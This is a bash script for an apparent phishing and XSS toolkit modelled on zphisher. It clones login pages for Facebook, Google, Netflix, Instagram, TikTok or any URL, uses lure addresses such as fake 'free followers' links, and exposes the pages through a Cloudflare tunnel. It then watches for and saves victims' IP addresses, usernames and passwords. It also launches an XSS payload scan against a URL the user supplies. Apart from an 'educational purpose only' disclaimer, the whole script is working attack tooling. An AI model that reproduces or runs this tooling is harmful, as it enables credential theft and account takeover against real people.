#!/bin/bash

#Project Webapp security - a tool that can create phishing pages and find XSS vulnerabilities

#Author:  TOMER DAHAN
#Github:  https://github.com/tomer333/
#Social:  https:https://www.linkedin.com/in/tomer-dahan-375540235/
#Version: 1.0

##Credits: TAHMID RAYAT creater of zphisher

#FrameWork:
#User can choose different options:
#	-Phishing: popular pages or custom and to run locally or via Cloudflared
#	 OR
#	-XSSscan: url, cookies and data.
#XSSscan programed in xss.py and uses xss_payloads.txt which can be configured.

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

##GLOBAL vars: HOST ip and HOST port
HOST='127.0.0.1'
PORT='8080'

##immune to ctrl+c
trap '' INT

## Reset terminal colors
function reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

#the script name icon and creator
function icon() {
	cat <<- EOF
		${GREEN} 
		${GREEN}░██╗░░░░░░░██╗███████╗██████╗░░█████╗░██████╗░██████╗░
		${GREEN}░██║░░██╗░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
		${GREEN}░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██████╔╝██████╔╝
		${GREEN}░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██╔═══╝░██╔═══╝░
		${GREEN}░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║██║░░░░░██║░░░░░
		${GREEN}░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░
	    ${GREEN}      
	      
		${WHITE}[${RED}-${WHITE}]${RED} Tool Created by Tomer Dahan
	EOF
}

## Small icon
function icon_small() {
	cat <<- EOF
		${GREEN}
		${GREEN}░█──░█ ░█▀▀▀ ░█▀▀█ ─█▀▀█ ░█▀▀█ ░█▀▀█ 
		${GREEN}░█░█░█ ░█▀▀▀ ░█▀▀▄ ░█▄▄█ ░█▄▄█ ░█▄▄█ 
		${GREEN}░█▄▀▄█ ░█▄▄▄ ░█▄▄█ ░█─░█ ░█─── ░█───
		${GREEN} 
		${GREEN}....................................
		${GREEN} 
	EOF
}

## Download Cloudflared
function download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}

## Install Cloudflared
function install_cloudflared() {
	mkdir .server/www > /dev/null 2>&1
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		{ clear; icon; echo; }
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi
}

## Kill already running web process
function kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Exit message and clear trash
function msg_exit() {
	{ clear; icon; echo; }
	rm xss_request.txt > /dev/null 2>&1
	rm -rf .server/www
	echo -e "${ORANGEBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## Site setup: set php server to run on ip and port 
function setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setting up server..."${WHITE}
	if [ $website = "custom" ]
	then
		cd .sites/"$website" && wget $mask > /dev/null 2>&1 && cd ../.. 
	fi
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address from ip.txt
function capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get captured credentials from phishing site from usernames.txt
function capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${MAGENTA} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}q or Q ${ORANGE}to exit. "
}

## Print captured data found in phishing site
function capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Waiting for Login Info, ${GREEN}Press q or Q ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		
		#read and wait for q or Q to exit loop
		#before exit some functions:
		#remove files from custom folder, the running server website folder and .cld.log (cluodflared link)
		#kill running web process
		read -t 1.5 -N 1 input
		if [[ $input = "q" ]] || [[ $input = "Q" ]]; then
			cd .sites/custom && rm -rf * > /dev/null 2>&1 && cd ../..
			cd .server/www && rm -rf * > /dev/null 2>&1 && cd ../..
			kill_pid
			rm -rf .cld.log > /dev/null 2>&1
			break 
		fi
	done
}

## Start phishing site via Cloudflared
function start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${ORANGE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${CYAN}[${WHITE}-${CYAN}]${ORANGE} Launching Cloudflared..."

	if [[ $(command -v termux-chroot) ]]
	then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
	fi

	{ sleep 2; clear; icon_small; }
	
	#loop to wait for cloudflared to configure a link in .cld.log
	echo -e "\n${CYAN}[${WHITE}-${CYAN}]${MAGENTA} Configuring Link... Please wait"
	while [ ! -f ".cld.log" ]; do : ; done
	
	#loop to wait for cloudflared to configure a url in .cld.log
	link1=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	while [ "$link1" == "" ]; 
	do
		link1=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	done
	
	{ sleep 1; clear; icon_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$link1"
	capture_data
}

## Start phishing site via localhost
function start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; icon_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Loading function for xss handler
function loading() {
	while true ; do
		printf "."
		sleep 0.5
	done
}

## XSS scan results handler
function xss_handler() {
	#thread loading to run while xss.py running
	loading &
	#saving loading pid for kill later
	loading_pid="$!"

	python xss.py > /dev/null 2>&1

	#kill loading
	kill "${loading_pid}" &> /dev/null

	{ clear; icon; echo; }
	#show on screen results
	cat xss_results.txt
	echo
	read -p "${ORANGE}[${WHITE}-${ORANGE}] Press Enter To Go Back: "
	rm xss_results.txt > /dev/null 2>&1
}

## About menu
function about() {
	{ clear; icon; echo; }
	cat <<- EOF
		${GREEN}Author   ${WHITE}:  ${RED}TOMER DAHAN
		${GREEN}Github   ${WHITE}:  ${ORANGE}https://github.com/tomer333/
		${GREEN}Social   ${WHITE}:  ${ORANGE}https:https://www.linkedin.com/in/tomer-dahan-375540235/
		${GREEN}Version  ${WHITE}:  ${RED}1.0

		${REDBG}${WHITE} Thanks To: TAHMID RAYAT creater of zphisher ${RESETBG}

		${RED}Warning:
		${ORANGE}This Tool is made for educational purpose only ${RED}!${WHITE}
		${ORANGE}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${MAGENTA} Main Menu     ${RED}[${WHITE}99${RED}]${MAGENTA} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Phishing selection
function phishing_menu() {
	{ clear; icon_small; }
	cat <<- EOF
		${ORANGEBG}${BLACK} Site Chosen: ${REDBG}${WHITE} $website ${RESETBG}

		${RED}[${WHITE}01${RED}]${CYAN} Localhost
		${RED}[${WHITE}02${RED}]${CYAN} cloudflared



		${RED}[${WHITE}99${RED}]${MAGENTA} Back to Main        ${RED}[${WHITE}00${RED}]${MAGENTA} Exit
		
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost
			main_menu;;
		2 | 02)
			start_cloudflared
			main_menu;;
		99)
			main_menu;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; phishing_menu; };;
	esac
}

## Site selection
function site_menu() {
	{ clear; icon_small; }
	cat <<- EOF
		${ORANGEBG}${BLACK} Site Selection: ${RESETBG}

		${RED}[${WHITE}01${RED}]${CYAN} facebook
		${RED}[${WHITE}02${RED}]${CYAN} google
		${RED}[${WHITE}03${RED}]${CYAN} netflix
		${RED}[${WHITE}04${RED}]${CYAN} instagram
		${RED}[${WHITE}05${RED}]${CYAN} tiktok
		${RED}[${WHITE}06${RED}]${CYAN} custom

		${RED}[${WHITE}99${RED}]${MAGENTA} Back to Main        ${RED}[${WHITE}00${RED}]${MAGENTA} Exit
		
	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a site to clone : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://www.facebook.com/'
			phishing_menu;;
		2 | 02)
			website="google"
			mask='http://get-unlimited-google-drive-free'
			phishing_menu;;
		3 | 03)
			website="netflix"
			mask='http://upgrade-your-netflix-plan-free'
			phishing_menu;;
		4 | 04)
			website="instagram"
			mask='http://get-unlimited-followers-for-instagram'
			phishing_menu;;
		5 | 05)
			website="tiktok"
			mask='http://tiktok-free-liker'
			phishing_menu;;
		6 | 06)
			website="custom"
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter full URL: " input_url
			mask=$input_url
			phishing_menu;;
		99)
			main_menu;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; phishing_menu; };;
	esac
}

## XSS selection
function xss_menu() {
	url=$(cat xss_request.txt | grep "url" | awk '{print $2}')
	cookies=$(cat xss_request.txt | grep "cookies" | awk '{for (i=2; i<=NF; i++) {printf("%s ", $i)}}')
	data=$(cat xss_request.txt | grep "data" | awk '{print $2}')
	
	{ clear; icon_small; }
	cat <<- EOF
		${CYANBG}${BLACK} XSS Menu: ${RESETBG}
		
		${ORANGE}Current XSS Request:
		
		${WHITE}URL:		${MAGENTA}$url
		${WHITE}Cookies:	${MAGENTA}$cookies
		${WHITE}Data:		${MAGENTA}$data
		
		
		${RED}[${WHITE}01${RED}]${CYAN} Set URL   			${RED}( ${WHITE}Example: ${CYAN}http://sudo.co.il/xss/level0.php ${RED})
		${RED}[${WHITE}02${RED}]${CYAN} Set Cookie/s		${RED}( ${WHITE}Example: ${CYAN}_ga=GA1.3.2125632932.1657623534; _gid=GA1.3.2058997139.1657623534; _gat=1 ${RED})
		${RED}[${WHITE}03${RED}]${CYAN} Set Data			${RED}( ${WHITE}Example: ${CYAN}email=hacker@mail.com ${RED})
		
		${RED}[${WHITE}04${RED}]${ORANGE} Start Attack


		${RED}[${WHITE}99${RED}]${MAGENTA} Back to Main        ${RED}[${WHITE}00${RED}]${MAGENTA} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select to Set : ${BLUE}"

	case $REPLY in 
		1 | 01)
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter URL: " xss_input_url
			printf "|---XSS Request---|\nurl: $xss_input_url\ncookies: $cookies\ndata: $data\n" > xss_request.txt
			sleep 1
			xss_menu;;
		2 | 02)
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter Cookie or Cookies: " xss_input_cookies
			printf "|---XSS Request---|\nurl: $url\ncookies: $xss_input_cookies\ndata: $data\n" > xss_request.txt
			xss_menu;;
		3 | 03)
			read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter Data: " xss_input_data
			printf "|---XSS Request---|\nurl: $url\ncookies: $cookies\ndata: $xss_input_data\n" > xss_request.txt
			xss_menu;;
		4 | 04)
			printf "${RED}[${WHITE}-${RED}]${ORANGE}XSS scan started please wait"
			printf "\n" > xss_results.txt
			xss_handler
			main_menu;;
		99)
			main_menu;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; xss_menu; };;

	esac
}

#Main Menu
function main_menu() {
	{ clear; icon; echo; }
	cat <<- EOF
		${ORANGE}[${WHITE}::${ORANGE}]${CYAN} Select Your Desired Service${ORANGE}[${WHITE}::${ORANGE}]

		${ORANGE}[${WHITE}01${ORANGE}]${CYAN} Phishing
		${ORANGE}[${WHITE}02${ORANGE}]${CYAN} XSS scan


		${ORANGE}[${WHITE}99${ORANGE}]${MAGENTA} About         ${ORANGE}[${WHITE}00${ORANGE}]${MAGENTA} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	
	case $REPLY in
		1 | 01)
			site_menu;;
		2 | 02)
			printf "|---XSS Request---|\nurl: None\ncookies: None\ndata: None\n" > xss_request.txt
			xss_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;

	esac
}

## Main
kill_pid
install_cloudflared
main_menu
